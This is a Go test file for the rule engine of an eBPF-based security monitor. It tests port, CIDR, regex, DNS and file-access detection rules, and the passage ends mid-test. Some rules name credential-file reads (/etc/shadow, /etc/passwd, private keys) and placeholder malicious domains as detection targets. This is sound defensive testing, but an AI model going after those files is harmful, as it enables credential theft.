// Package correlator provides event correlation and rule-based detection.
package correlator

import (
	"fmt"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/zugolO/ebpf-guard/pkg/types"
)

func TestRuleEngine_Evaluate(t *testing.T) {
	tests := []struct {
		name     string
		rules    []Rule
		event    types.Event
		expected int
	}{
		{
			name:     "empty ruleset",
			rules:    []Rule{},
			event:    types.Event{Type: types.EventTCPConnect},
			expected: 0,
		},
		{
			name: "network rule - dport equals",
			rules: []Rule{
				{
					ID:        "net_001",
					Name:      "Port 8080 Rule",
					EventType: types.EventTCPConnect,
					Condition: RuleCondition{Field: "dport", Op: OpEquals, Values: []string{"8080"}},
					Severity:  types.SeverityWarning,
					Action:    ActionAlert,
				},
			},
			event: types.Event{
				Type:    types.EventTCPConnect,
				Network: &types.NetworkEvent{Dport: 8080},
			},
			expected: 1,
		},
		{
			name: "network rule - dport not equals",
			rules: []Rule{
				{
					ID:        "net_001",
					Name:      "Port 8080 Rule",
					EventType: types.EventTCPConnect,
					Condition: RuleCondition{Field: "dport", Op: OpEquals, Values: []string{"8080"}},
					Severity:  types.SeverityWarning,
					Action:    ActionAlert,
				},
			},
			event: types.Event{
				Type:    types.EventTCPConnect,
				Network: &types.NetworkEvent{Dport: 9090},
			},
			expected: 0,
		},
		{
			name: "network rule - dport in list",
			rules: []Rule{
				{
					ID:        "net_002",
					Name:      "Allowed Ports",
					EventType: types.EventTCPConnect,
					Condition: RuleCondition{Field: "dport", Op: OpIn, Values: []string{"80", "443", "53"}},
					Severity:  types.SeverityWarning,
					Action:    ActionAlert,
				},
			},
			event: types.Event{
				Type:    types.EventTCPConnect,
				Network: &types.NetworkEvent{Dport: 443},
			},
			expected: 1,
		},
		{
			name: "network rule - dport not_in list",
			rules: []Rule{
				{
					ID:        "net_003",
					Name:      "Unexpected Egress",
					EventType: types.EventTCPConnect,
					Condition: RuleCondition{Field: "dport", Op: OpNotIn, Values: []string{"80", "443", "53"}},
					Severity:  types.SeverityWarning,
					Action:    ActionAlert,
				},
			},
			event: types.Event{
				Type:    types.EventTCPConnect,
				Network: &types.NetworkEvent{Dport: 8080},
			},
			expected: 1,
		},
		{
			name: "file rule - filename prefix",
			rules: []Rule{
				{
					ID:        "file_001",
					Name:      "Sensitive File Access",
					EventType: types.EventFileAccess,
					Condition: RuleCondition{Field: "filename", Op: OpPrefix, Values: []string{"/etc/shadow", "/etc/passwd"}},
					Severity:  types.SeverityCritical,
					Action:    ActionAlert,
				},
			},
			event: types.Event{
				Type: types.EventFileAccess,
				File: &types.FileEvent{
					Filename: stringToByteArray("/etc/shadow"),
				},
			},
			expected: 1,
		},
		{
			name: "file rule - filename no match",
			rules: []Rule{
				{
					ID:        "file_001",
					Name:      "Sensitive File Access",
					EventType: types.EventFileAccess,
					Condition: RuleCondition{Field: "filename", Op: OpPrefix, Values: []string{"/etc/shadow"}},
					Severity:  types.SeverityCritical,
					Action:    ActionAlert,
				},
			},
			event: types.Event{
				Type: types.EventFileAccess,
				File: &types.FileEvent{
					Filename: stringToByteArray("/tmp/test"),
				},
			},
			expected: 0,
		},
		{
			name: "wrong event type",
			rules: []Rule{
				{
					ID:        "net_001",
					Name:      "Network Rule",
					EventType: types.EventTCPConnect,
					Condition: RuleCondition{Field: "dport", Op: OpEquals, Values: []string{"8080"}},
					Severity:  types.SeverityWarning,
					Action:    ActionAlert,
				},
			},
			event: types.Event{
				Type: types.EventSyscall,
			},
			expected: 0,
		},
		{
			name: "multiple rules - one matches",
			rules: []Rule{
				{
					ID:        "rule_001",
					Name:      "Port 80",
					EventType: types.EventTCPConnect,
					Condition: RuleCondition{Field: "dport", Op: OpEquals, Values: []string{"80"}},
					Severity:  types.SeverityWarning,
					Action:    ActionAlert,
				},
				{
					ID:        "rule_002",
					Name:      "Port 8080",
					EventType: types.EventTCPConnect,
					Condition: RuleCondition{Field: "dport", Op: OpEquals, Values: []string{"8080"}},
					Severity:  types.SeverityWarning,
					Action:    ActionAlert,
				},
			},
			event: types.Event{
				Type:    types.EventTCPConnect,
				Network: &types.NetworkEvent{Dport: 8080},
			},
			expected: 1,
		},
		{
			name: "multiple rules - both match",
			rules: []Rule{
				{
					ID:        "rule_001",
					Name:      "Any Port",
					EventType: types.EventTCPConnect,
					Condition: RuleCondition{Field: "dport", Op: OpNotIn, Values: []string{}},
					Severity:  types.SeverityWarning,
					Action:    ActionAlert,
				},
				{
					ID:        "rule_002",
					Name:      "Port 8080",
					EventType: types.EventTCPConnect,
					Condition: RuleCondition{Field: "dport", Op: OpEquals, Values: []string{"8080"}},
					Severity:  types.SeverityCritical,
					Action:    ActionAlert,
				},
			},
			event: types.Event{
				Type:    types.EventTCPConnect,
				Network: &types.NetworkEvent{Dport: 8080},
			},
			expected: 2,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			engine := NewRuleEngine(tt.rules)
			alerts := engine.Evaluate(tt.event)
			assert.Len(t, alerts, tt.expected)
		})
	}
}

func TestRuleEngine_AlertContent(t *testing.T) {
	rules := []Rule{
		{
			ID:          "test_001",
			Name:        "Test Alert",
			Description: "This is a test alert",
			EventType:   types.EventTCPConnect,
			Condition:   RuleCondition{Field: "dport", Op: OpEquals, Values: []string{"8080"}},
			Severity:    types.SeverityCritical,
			Action:      ActionAlert,
		},
	}

	engine := NewRuleEngine(rules)
	event := types.Event{
		Type:      types.EventTCPConnect,
		PID:       1234,
		Timestamp: 1234567890,
		Network:   &types.NetworkEvent{Dport: 8080},
	}

	alerts := engine.Evaluate(event)
	require.Len(t, alerts, 1)

	alert := alerts[0]
	// ID is intentionally empty from Evaluate — Ingest assigns the canonical monotonic ID.
	assert.Empty(t, alert.ID)
	assert.Equal(t, "test_001", alert.RuleID)
	assert.Equal(t, "Test Alert", alert.RuleName)
	assert.Equal(t, "This is a test alert", alert.Message)
	assert.Equal(t, types.SeverityCritical, alert.Severity)
	assert.Equal(t, uint32(1234), alert.PID)
	assert.Equal(t, uint32(1234), alert.Event.PID)
}

// TestRuleEngine_AlertDetailsCarriesFilePath is the regression test for
// 5.8e.1 (находка №18): the triggering file path was previously visible only
// on the unserialized Alert.Event field (json:"-"), so a dump of stored
// alerts could not show which path an "ebpf-guard-self" exception was
// failing to match. Both Evaluate and EvaluateInto must populate
// Details["file.path"] for file-access alerts, preferring the fd-resolved
// path (reads/writes) over Filename (opens) — see fileAccessPath.
func TestRuleEngine_AlertDetailsCarriesFilePath(t *testing.T) {
	rules := []Rule{
		{
			ID:        "file_001",
			Name:      "Any file read",
			EventType: types.EventFileAccess,
			Condition: RuleCondition{Field: "op", Op: OpEquals, Values: []string{"read"}},
			Severity:  types.SeverityWarning,
			Action:    ActionAlert,
		},
	}
	engine := NewRuleEngine(rules)

	t.Run("read event uses fd-resolved path", func(t *testing.T) {
		event := types.Event{
			Type: types.EventFileAccess,
			PID:  1234,
			File: &types.FileEvent{Op: 1, FDPath: "/proc/1234/maps"},
		}

		alerts := engine.Evaluate(event)
		require.Len(t, alerts, 1)
		require.NotNil(t, alerts[0].Details)
		assert.Equal(t, "/proc/1234/maps", alerts[0].Details["file.path"])

		var got []types.Alert
		engine.EvaluateInto(event, func(a types.Alert) { got = append(got, a) })
		require.Len(t, got, 1)
		require.NotNil(t, got[0].Details)
		assert.Equal(t, "/proc/1234/maps", got[0].Details["file.path"])
	})

	t.Run("open event with no fd path leaves Details nil", func(t *testing.T) {
		event := types.Event{
			Type: types.EventFileAccess,
			PID:  1234,
			File: &types.FileEvent{Op: 1}, // no FDPath, no Filename set
		}
		alerts := engine.Evaluate(event)
		require.Len(t, alerts, 1)
		assert.Nil(t, alerts[0].Details)
	})
}

func TestRuleEngine_RegexOperator(t *testing.T) {
	tests := []struct {
		name     string
		pattern  string
		value    string
		expected bool
	}{
		{"simple match", "^test.*", "test123", true},
		{"no match", "^test.*", "nottest", false},
		{"port pattern", ":(80|443)$", "192.168.1.1:80", true},
		{"port pattern no match", ":(80|443)$", "192.168.1.1:8080", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rules := []Rule{
				{
					ID:        "regex_test",
					Name:      "Regex Test",
					EventType: types.EventFileAccess,
					Condition: RuleCondition{
						Field:  "filename",
						Op:     OpRegex,
						Values: []string{tt.pattern},
					},
					Severity: types.SeverityWarning,
					Action:   ActionAlert,
				},
			}

			engine := NewRuleEngine(rules)
			event := types.Event{
				Type: types.EventFileAccess,
				File: &types.FileEvent{
					Filename: stringToByteArray(tt.value),
				},
			}

			alerts := engine.Evaluate(event)
			if tt.expected {
				assert.Len(t, alerts, 1)
			} else {
				assert.Len(t, alerts, 0)
			}
		})
	}
}

func TestRuleEngine_NumericOperators(t *testing.T) {
	tests := []struct {
		name      string
		op        RuleConditionOperator
		value     uint16
		threshold string
		expected  bool
	}{
		{"gt - greater", OpGreaterThan, 100, "50", true},
		{"gt - equal", OpGreaterThan, 100, "100", false},
		{"gt - less", OpGreaterThan, 50, "100", false},
		{"lt - less", OpLessThan, 50, "100", true},
		{"lt - equal", OpLessThan, 100, "100", false},
		{"lt - greater", OpLessThan, 100, "50", false},
		{"gte - greater", OpGreaterOrEqual, 100, "50", true},
		{"gte - equal", OpGreaterOrEqual, 100, "100", true},
		{"gte - less", OpGreaterOrEqual, 50, "100", false},
		{"lte - less", OpLessOrEqual, 50, "100", true},
		{"lte - equal", OpLessOrEqual, 100, "100", true},
		{"lte - greater", OpLessOrEqual, 100, "50", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rules := []Rule{
				{
					ID:        "numeric_test",
					Name:      "Numeric Test",
					EventType: types.EventTCPConnect,
					Condition: RuleCondition{
						Field:  "dport",
						Op:     tt.op,
						Values: []string{tt.threshold},
					},
					Severity: types.SeverityWarning,
					Action:   ActionAlert,
				},
			}

			engine := NewRuleEngine(rules)
			event := types.Event{
				Type:    types.EventTCPConnect,
				Network: &types.NetworkEvent{Dport: tt.value},
			}

			alerts := engine.Evaluate(event)
			if tt.expected {
				assert.Len(t, alerts, 1)
			} else {
				assert.Len(t, alerts, 0)
			}
		})
	}
}

func TestRuleEngine_CIDROperators(t *testing.T) {
	tests := []struct {
		name     string
		op       RuleConditionOperator
		ip       string
		cidrs    []string
		expected bool
	}{
		{"in_cidr - match", OpInCIDR, "192.168.1.100", []string{"192.168.1.0/24"}, true},
		{"in_cidr - no match", OpInCIDR, "10.0.0.1", []string{"192.168.1.0/24"}, false},
		{"in_cidr - multiple match", OpInCIDR, "10.0.0.1", []string{"192.168.1.0/24", "10.0.0.0/8"}, true},
		{"not_in_cidr - match", OpNotInCIDR, "10.0.0.1", []string{"192.168.1.0/24"}, true},
		{"not_in_cidr - no match", OpNotInCIDR, "192.168.1.100", []string{"192.168.1.0/24"}, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rules := []Rule{
				{
					ID:        "cidr_test",
					Name:      "CIDR Test",
					EventType: types.EventTCPConnect,
					Condition: RuleCondition{
						Field:  "daddr",
						Op:     tt.op,
						Values: tt.cidrs,
					},
					Severity: types.SeverityWarning,
					Action:   ActionAlert,
				},
			}

			engine := NewRuleEngine(rules)
			ipBytes := ipToBytes(tt.ip)
			event := types.Event{
				Type: types.EventTCPConnect,
				Network: &types.NetworkEvent{
					Daddr:  ipBytes,
					Family: types.AFInet,
				},
			}

			alerts := engine.Evaluate(event)
			if tt.expected {
				assert.Len(t, alerts, 1)
			} else {
				assert.Len(t, alerts, 0)
			}
		})
	}
}

func TestRuleEngine_ConditionGroupAND(t *testing.T) {
	rules := []Rule{
		{
			ID:        "and_test",
			Name:      "AND Test",
			EventType: types.EventTCPConnect,
			ConditionGroup: &RuleConditionGroup{
				Operator: "and",
				Conditions: []RuleCondition{
					{Field: "dport", Op: OpEquals, Values: []string{"8080"}},
					{Field: "daddr", Op: OpEquals, Values: []string{"192.168.1.1"}},
				},
			},
			Severity: types.SeverityWarning,
			Action:   ActionAlert,
		},
	}

	engine := NewRuleEngine(rules)

	// Both conditions match
	event1 := types.Event{
		Type: types.EventTCPConnect,
		Network: &types.NetworkEvent{
			Dport:  8080,
			Daddr:  ipToBytes("192.168.1.1"),
			Family: types.AFInet,
		},
	}
	alerts := engine.Evaluate(event1)
	assert.Len(t, alerts, 1)

	// Only one condition matches
	event2 := types.Event{
		Type: types.EventTCPConnect,
		Network: &types.NetworkEvent{
			Dport:  8080,
			Daddr:  ipToBytes("10.0.0.1"),
			Family: types.AFInet,
		},
	}
	alerts = engine.Evaluate(event2)
	assert.Len(t, alerts, 0)
}

func TestRuleEngine_ConditionGroupOR(t *testing.T) {
	rules := []Rule{
		{
			ID:        "or_test",
			Name:      "OR Test",
			EventType: types.EventTCPConnect,
			ConditionGroup: &RuleConditionGroup{
				Operator: "or",
				Conditions: []RuleCondition{
					{Field: "dport", Op: OpEquals, Values: []string{"8080"}},
					{Field: "dport", Op: OpEquals, Values: []string{"9090"}},
				},
			},
			Severity: types.SeverityWarning,
			Action:   ActionAlert,
		},
	}

	engine := NewRuleEngine(rules)

	// First condition matches
	event1 := types.Event{
		Type:    types.EventTCPConnect,
		Network: &types.NetworkEvent{Dport: 8080},
	}
	alerts := engine.Evaluate(event1)
	assert.Len(t, alerts, 1)

	// Second condition matches
	event2 := types.Event{
		Type:    types.EventTCPConnect,
		Network: &types.NetworkEvent{Dport: 9090},
	}
	alerts = engine.Evaluate(event2)
	assert.Len(t, alerts, 1)

	// Neither condition matches
	event3 := types.Event{
		Type:    types.EventTCPConnect,
		Network: &types.NetworkEvent{Dport: 3000},
	}
	alerts = engine.Evaluate(event3)
	assert.Len(t, alerts, 0)
}

func TestRuleEngine_NotEqualsOperator(t *testing.T) {
	rules := []Rule{
		{
			ID:        "not_equals_test",
			Name:      "Not Equals Test",
			EventType: types.EventTCPConnect,
			Condition: RuleCondition{
				Field:  "dport",
				Op:     OpNotEquals,
				Values: []string{"80"},
			},
			Severity: types.SeverityWarning,
			Action:   ActionAlert,
		},
	}

	engine := NewRuleEngine(rules)

	// Port is not 80 - should match
	event1 := types.Event{
		Type:    types.EventTCPConnect,
		Network: &types.NetworkEvent{Dport: 8080},
	}
	alerts := engine.Evaluate(event1)
	assert.Len(t, alerts, 1)

	// Port is 80 - should not match
	event2 := types.Event{
		Type:    types.EventTCPConnect,
		Network: &types.NetworkEvent{Dport: 80},
	}
	alerts = engine.Evaluate(event2)
	assert.Len(t, alerts, 0)
}

func TestContains(t *testing.T) {
	tests := []struct {
		slice    []string
		value    string
		expected bool
	}{
		{[]string{"a", "b", "c"}, "b", true},
		{[]string{"a", "b", "c"}, "d", false},
		{[]string{}, "a", false},
		{[]string{"a"}, "a", true},
	}

	for _, tt := range tests {
		result := contains(tt.slice, tt.value)
		assert.Equal(t, tt.expected, result)
	}
}

func TestHasPrefix(t *testing.T) {
	tests := []struct {
		prefixes []string
		value    string
		expected bool
	}{
		{[]string{"/etc/", "/var/"}, "/etc/passwd", true},
		{[]string{"/etc/", "/var/"}, "/var/log", true},
		{[]string{"/etc/", "/var/"}, "/tmp/test", false},
		{[]string{}, "/etc/passwd", false},
		{[]string{"/etc/"}, "/etc/", true},
	}

	for _, tt := range tests {
		result := hasPrefix(tt.prefixes, tt.value)
		assert.Equal(t, tt.expected, result)
	}
}

// Helper function to convert string to fixed-size byte array
func stringToByteArray(s string) [256]byte {
	var arr [256]byte
	copy(arr[:], s)
	return arr
}

// Helper function to convert IP string to 16-byte array (IPv4 in first 4 bytes)
func ipToBytes(ip string) [16]byte {
	var result [16]byte
	parts := []byte(ip)
	// Simple parsing for test IPs like "192.168.1.1"
	// In real code, use net.ParseIP
	var nums [4]int
	var idx int
	var current int
	for _, b := range parts {
		if b == '.' {
			nums[idx] = current
			idx++
			current = 0
		} else {
			current = current*10 + int(b-'0')
		}
	}
	nums[idx] = current
	for i := 0; i < 4; i++ {
		result[i] = byte(nums[i])
	}
	return result
}

// TestValidateRule_FieldValidation tests field name validation for different event types.
func TestValidateRule_FieldValidation(t *testing.T) {
	tests := []struct {
		name      string
		rule      Rule
		wantError string
	}{
		{
			name: "valid network field - dport",
			rule: Rule{
				ID:        "test_001",
				Name:      "Test Rule",
				EventType: types.EventTCPConnect,
				Condition: RuleCondition{Field: "dport", Op: OpEquals, Values: []string{"80"}},
			},
			wantError: "",
		},
		{
			name: "valid network field - daddr",
			rule: Rule{
				ID:        "test_002",
				Name:      "Test Rule",
				EventType: types.EventTCPConnect,
				Condition: RuleCondition{Field: "daddr", Op: OpEquals, Values: []string{"192.168.1.1"}},
			},
			wantError: "",
		},
		{
			name: "invalid network field",
			rule: Rule{
				ID:        "test_003",
				Name:      "Test Rule",
				EventType: types.EventTCPConnect,
				Condition: RuleCondition{Field: "filename", Op: OpEquals, Values: []string{"test"}},
			},
			wantError: "invalid field name",
		},
		{
			name: "valid file field - filename",
			rule: Rule{
				ID:        "test_004",
				Name:      "Test Rule",
				EventType: types.EventFileAccess,
				Condition: RuleCondition{Field: "filename", Op: OpPrefix, Values: []string{"/etc/"}},
			},
			wantError: "",
		},
		{
			name: "valid file field - flags",
			rule: Rule{
				ID:        "test_005",
				Name:      "Test Rule",
				EventType: types.EventFileAccess,
				Condition: RuleCondition{Field: "flags", Op: OpEquals, Values: []string{"0"}},
			},
			wantError: "",
		},
		{
			name: "invalid file field",
			rule: Rule{
				ID:        "test_006",
				Name:      "Test Rule",
				EventType: types.EventFileAccess,
				Condition: RuleCondition{Field: "dport", Op: OpEquals, Values: []string{"80"}},
			},
			wantError: "invalid field name",
		},
		{
			name: "valid syscall field - nr",
			rule: Rule{
				ID:        "test_007",
				Name:      "Test Rule",
				EventType: types.EventSyscall,
				Condition: RuleCondition{Field: "nr", Op: OpEquals, Values: []string{"1"}},
			},
			wantError: "",
		},
		{
			name: "invalid syscall field",
			rule: Rule{
				ID:        "test_008",
				Name:      "Test Rule",
				EventType: types.EventSyscall,
				Condition: RuleCondition{Field: "filename", Op: OpEquals, Values: []string{"test"}},
			},
			wantError: "invalid field name",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateRule(&tt.rule)
			if tt.wantError == "" {
				assert.NoError(t, err)
			} else {
				assert.ErrorContains(t, err, tt.wantError)
			}
		})
	}
}

// TestValidateRule_RegexValidation tests regex pattern validation.
func TestValidateRule_RegexValidation(t *testing.T) {
	tests := []struct {
		name      string
		condition RuleCondition
		wantError string
	}{
		{
			name:      "valid regex",
			condition: RuleCondition{Field: "filename", Op: OpRegex, Values: []string{`.*\.conf$`, `/etc/.*`}},
			wantError: "",
		},
		{
			name:      "invalid regex",
			condition: RuleCondition{Field: "filename", Op: OpRegex, Values: []string{`[invalid`}},
			wantError: "invalid regex pattern",
		},
		{
			name:      "empty regex list",
			condition: RuleCondition{Field: "filename", Op: OpRegex, Values: []string{}},
			wantError: "requires at least one pattern",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := Rule{
				ID:        "test_regex",
				Name:      "Test Rule",
				EventType: types.EventFileAccess,
				Condition: tt.condition,
			}
			err := validateRule(&rule)
			if tt.wantError == "" {
				assert.NoError(t, err)
			} else {
				assert.ErrorContains(t, err, tt.wantError)
			}
		})
	}
}

// TestValidateRule_CIDRValidation tests CIDR range validation.
func TestValidateRule_CIDRValidation(t *testing.T) {
	tests := []struct {
		name      string
		condition RuleCondition
		wantError string
	}{
		{
			name:      "valid CIDR",
			condition: RuleCondition{Field: "daddr", Op: OpInCIDR, Values: []string{"192.168.0.0/16", "10.0.0.0/8"}},
			wantError: "",
		},
		{
			name:      "invalid CIDR",
			condition: RuleCondition{Field: "daddr", Op: OpInCIDR, Values: []string{"invalid-cidr"}},
			wantError: "invalid CIDR range",
		},
		{
			name:      "empty CIDR list",
			condition: RuleCondition{Field: "daddr", Op: OpInCIDR, Values: []string{}},
			wantError: "requires at least one CIDR range",
		},
		{
			name:      "CIDR on wrong field",
			condition: RuleCondition{Field: "dport", Op: OpInCIDR, Values: []string{"192.168.0.0/16"}},
			wantError: "CIDR operator",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := Rule{
				ID:        "test_cidr",
				Name:      "Test Rule",
				EventType: types.EventTCPConnect,
				Condition: tt.condition,
			}
			err := validateRule(&rule)
			if tt.wantError == "" {
				assert.NoError(t, err)
			} else {
				assert.ErrorContains(t, err, tt.wantError)
			}
		})
	}
}

// TestSubGroupNestedANDOR verifies two-level AND(OR(c1, c2), c3) SubGroup evaluation.
func TestSubGroupNestedANDOR(t *testing.T) {
	// AND( OR(dport==80, dport==443), daddr==192.168.1.1 )
	rule := Rule{
		ID:        "subgroup_001",
		Name:      "SubGroup AND/OR Test",
		EventType: types.EventTCPConnect,
		ConditionGroup: &RuleConditionGroup{
			Operator: "and",
			Conditions: []RuleCondition{
				{Field: "daddr", Op: OpEquals, Values: []string{"192.168.1.1"}},
			},
			SubGroups: []RuleConditionGroup{
				{
					Operator: "or",
					Conditions: []RuleCondition{
						{Field: "dport", Op: OpEquals, Values: []string{"80"}},
						{Field: "dport", Op: OpEquals, Values: []string{"443"}},
					},
				},
			},
		},
		Severity: types.SeverityWarning,
		Action:   ActionAlert,
	}
	engine := NewRuleEngine([]Rule{rule})

	// Both outer cond and subgroup OR match → should alert
	ev1 := types.Event{
		Type: types.EventTCPConnect,
		Network: &types.NetworkEvent{
			Dport:  443,
			Daddr:  ipToBytes("192.168.1.1"),
			Family: types.AFInet,
		},
	}
	assert.Len(t, engine.Evaluate(ev1), 1, "AND(OR(80,443), daddr match) should alert")

	// Outer cond matches but subgroup OR does not → no alert
	ev2 := types.Event{
		Type: types.EventTCPConnect,
		Network: &types.NetworkEvent{
			Dport:  8080,
			Daddr:  ipToBytes("192.168.1.1"),
			Family: types.AFInet,
		},
	}
	assert.Len(t, engine.Evaluate(ev2), 0, "AND(OR no match, daddr match) should not alert")

	// SubGroup OR matches but outer cond does not → no alert
	ev3 := types.Event{
		Type: types.EventTCPConnect,
		Network: &types.NetworkEvent{
			Dport:  80,
			Daddr:  ipToBytes("10.0.0.1"),
			Family: types.AFInet,
		},
	}
	assert.Len(t, engine.Evaluate(ev3), 0, "AND(OR match, daddr no match) should not alert")
}

// TestSubGroupRegexPatternCompiled verifies regex inside a SubGroup is compiled and matches.
func TestSubGroupRegexPatternCompiled(t *testing.T) {
	rule := Rule{
		ID:        "subgroup_regex",
		Name:      "SubGroup Regex Test",
		EventType: types.EventFileAccess,
		ConditionGroup: &RuleConditionGroup{
			Operator: "and",
			Conditions: []RuleCondition{
				{Field: "op", Op: OpEquals, Values: []string{"open"}},
			},
			SubGroups: []RuleConditionGroup{
				{
					Operator: "or",
					Conditions: []RuleCondition{
						{Field: "filename", Op: OpRegex, Values: []string{`^/etc/.*\.key$`}},
					},
				},
			},
		},
		Severity: types.SeverityWarning,
		Action:   ActionAlert,
	}
	engine := NewRuleEngine([]Rule{rule})

	// Matches regex in subgroup
	ev1 := types.Event{
		Type: types.EventFileAccess,
		File: &types.FileEvent{
			Op:       0,
			Filename: stringToByteArray("/etc/ssl/private.key"),
		},
	}
	assert.Len(t, engine.Evaluate(ev1), 1, "regex in subgroup should match")

	// Does not match regex
	ev2 := types.Event{
		Type: types.EventFileAccess,
		File: &types.FileEvent{
			Op:       0,
			Filename: stringToByteArray("/etc/ssl/cert.pem"),
		},
	}
	assert.Len(t, engine.Evaluate(ev2), 0, "regex in subgroup should not match")
}

// TestSubGroupCIDRCondition verifies CIDR condition inside a SubGroup matches IP.
func TestSubGroupCIDRCondition(t *testing.T) {
	rule := Rule{
		ID:        "subgroup_cidr",
		Name:      "SubGroup CIDR Test",
		EventType: types.EventTCPConnect,
		ConditionGroup: &RuleConditionGroup{
			Operator: "and",
			Conditions: []RuleCondition{
				{Field: "dport", Op: OpEquals, Values: []string{"443"}},
			},
			SubGroups: []RuleConditionGroup{
				{
					Operator: "or",
					Conditions: []RuleCondition{
						{Field: "daddr", Op: OpInCIDR, Values: []string{"10.0.0.0/8"}},
					},
				},
			},
		},
		Severity: types.SeverityWarning,
		Action:   ActionAlert,
	}
	engine := NewRuleEngine([]Rule{rule})

	evMatch := types.Event{
		Type: types.EventTCPConnect,
		Network: &types.NetworkEvent{
			Dport:  443,
			Daddr:  ipToBytes("10.1.2.3"),
			Family: types.AFInet,
		},
	}
	assert.Len(t, engine.Evaluate(evMatch), 1, "CIDR in subgroup should match")

	evNoMatch := types.Event{
		Type: types.EventTCPConnect,
		Network: &types.NetworkEvent{
			Dport:  443,
			Daddr:  ipToBytes("192.168.1.1"),
			Family: types.AFInet,
		},
	}
	assert.Len(t, engine.Evaluate(evNoMatch), 0, "CIDR in subgroup should not match out-of-range IP")
}

// TestOpNotInEmptyFieldValue verifies OpNotIn with empty field and non-empty values list returns true.
func TestOpNotInEmptyFieldValue(t *testing.T) {
	// DNS event with empty qname — OpNotIn should return true (empty is not in the list)
	rule := Rule{
		ID:        "opnotin_empty",
		Name:      "OpNotIn Empty Field Test",
		EventType: types.EventDNS,
		Condition: RuleCondition{
			Field:  "qname",
			Op:     OpNotIn,
			Values: []string{"evil.com", "malware.net"},
		},
		Severity: types.SeverityWarning,
		Action:   ActionAlert,
	}
	engine := NewRuleEngine([]Rule{rule})

	evEmptyQName := types.Event{
		Type: types.EventDNS,
		DNS:  &types.DNSEvent{QName: ""},
	}
	// Empty string is not in ["evil.com", "malware.net"] → OpNotIn should be true → alert fires
	assert.Len(t, engine.Evaluate(evEmptyQName), 1, "OpNotIn with empty field value should return true")

	evMatchingQName := types.Event{
		Type: types.EventDNS,
		DNS:  &types.DNSEvent{QName: "evil.com"},
	}
	// "evil.com" IS in the list → OpNotIn should be false → no alert
	assert.Len(t, engine.Evaluate(evMatchingQName), 0, "OpNotIn with matching value should return false")
}

// TestRuleLoaderEmptyConditionGroup verifies that loading a rule with an empty
// condition_group returns a validation error.
func TestRuleLoaderEmptyConditionGroup(t *testing.T) {
	rule := &Rule{
		ID:        "empty_group",
		Name:      "Empty Group Rule",
		EventType: types.EventTCPConnect,
		ConditionGroup: &RuleConditionGroup{
			Operator:   "and",
			Conditions: []RuleCondition{},
			SubGroups:  []RuleConditionGroup{},
		},
		Severity: types.SeverityWarning,
		Action:   ActionAlert,
	}
	err := validateRule(rule)
	require.Error(t, err, "empty condition_group should fail validation")
	assert.Contains(t, err.Error(), "condition_group has no conditions or subgroups")
}

// TestRuleLoaderEmptyValuesList verifies that loading a rule whose condition
// uses a list-based operator with an empty values list is rejected (#148),
// and that the same rule with a non-empty list loads fine.
func TestRuleLoaderEmptyValuesList(t *testing.T) {
	baseRule := func(values []string) *Rule {
		return &Rule{
			ID:        "empty_values",
			Name:      "Empty Values Rule",
			EventType: types.EventFileAccess,
			Condition: RuleCondition{Field: "filename", Op: OpNotIn, Values: values},
			Severity:  types.SeverityWarning,
			Action:    ActionAlert,
		}
	}

	err := validateRule(baseRule([]string{}))
	require.Error(t, err, "empty values list should fail validation")
	assert.Contains(t, err.Error(), "requires a non-empty values list")
	assert.Contains(t, err.Error(), "would silently match every event")

	err = validateRule(baseRule([]string{"/etc/shadow"}))
	require.NoError(t, err, "non-empty values list should load")
}

// BenchmarkOpInLargeSet measures O(1) map lookup vs O(n) linear scan for a 1000-element set.
func BenchmarkOpInLargeSet(b *testing.B) {
	// Build a 1000-element values list
	values := make([]string, 1000)
	for i := range values {
		values[i] = fmt.Sprintf("value-%d", i)
	}
	rule := Rule{
		ID:        "bench_in",
		Name:      "Bench OpIn",
		EventType: types.EventDNS,
		Condition: RuleCondition{Field: "qname", Op: OpIn, Values: values},
		Severity:  types.SeverityWarning,
		Action:    ActionAlert,
	}
	engine := NewRuleEngine([]Rule{rule})
	// Use a value that is NOT in the list — worst case for linear scan.
	event := types.Event{
		Type: types.EventDNS,
		DNS:  &types.DNSEvent{QName: "not-in-list"},
	}

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = engine.Evaluate(event)
	}
}

// BenchmarkAlertIDGeneration measures allocations for Alert ID generation.
// Target: 1 alloc/op (fmt.Sprintf) instead of 4 (string concatenation).
// Results: fmt.Sprintf("%s-%d-%d", ruleID, ts, pid) = 1 alloc/op
func BenchmarkAlertIDGeneration(b *testing.B) {
	rules := []Rule{
		{
			ID:        "rule_bench_001",
			Name:      "Benchmark Rule",
			EventType: types.EventTCPConnect,
			Condition: RuleCondition{Field: "dport", Op: OpEquals, Values: []string{"8080"}},
			Severity:  types.SeverityWarning,
			Action:    ActionAlert,
		},
	}
	engine := NewRuleEngine(rules)
	event := types.Event{
		Type:      types.EventTCPConnect,
		Timestamp: 1234567890123456789,
		PID:       12345,
		Network:   &types.NetworkEvent{Dport: 8080},
	}

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		alerts := engine.Evaluate(event)
		if len(alerts) == 0 {
			b.Fatal("expected alert")
		}
		_ = alerts[0].ID
	}
}

// TestFDEnrichment verifies that fd.name and fd.name_truncated fields work
// correctly for file access events (issue #47).
func TestFDEnrichment(t *testing.T) {
	writeRule := Rule{
		ID:        "fd_001",
		Name:      "Sensitive Write via fd",
		EventType: types.EventFileAccess,
		Condition: RuleCondition{
			Field:  "fd.name",
			Op:     OpPrefix,
			Values: []string{"/etc/passwd"},
		},
		Severity: types.SeverityCritical,
		Action:   ActionAlert,
	}

	engine := NewRuleEngine([]Rule{writeRule})

	t.Run("write event with resolved fd.name fires rule", func(t *testing.T) {
		event := types.Event{
			Type: types.EventFileAccess,
			File: &types.FileEvent{
				Op:     2, // FILE_OP_WRITE
				FDPath: "/etc/passwd",
			},
		}
		alerts := engine.Evaluate(event)
